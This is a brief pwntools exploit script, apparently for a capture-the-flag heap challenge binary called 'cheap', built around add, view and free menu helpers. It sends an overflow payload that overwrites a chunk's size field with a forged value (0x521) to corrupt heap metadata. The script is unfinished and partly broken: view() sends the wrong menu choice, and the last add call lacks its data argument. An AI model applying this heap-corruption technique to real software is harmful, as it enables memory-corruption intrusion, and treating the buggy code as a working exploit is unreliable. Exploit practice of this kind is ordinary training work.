from pwn import *

io = process('./cheap')

def add(size, data):
    print(io.recvuntil(b'Choice: '))
    io.sendline('1')
    print(io.recv())
    io.sendline(str(size))
    print(io.recv())
    io.sendline(data)

def view():
    print(io.recvuntil(b'Choice: '))
    io.sendline('1')
def free():
    print(io.recvuntil(b'Choice: '))
    io.sendline('3')


add(0x88, b'BRUH')
free()
add(0x408, b'OK')
free()
add(0x100, b'OK')
add(0x78, b'OK')
payload  = b'A'*0x80+p64(0x80)+p64(0x521)
add(0x88, payload)
add(0x510, b'OK')
free()
pause()
add(0x98)
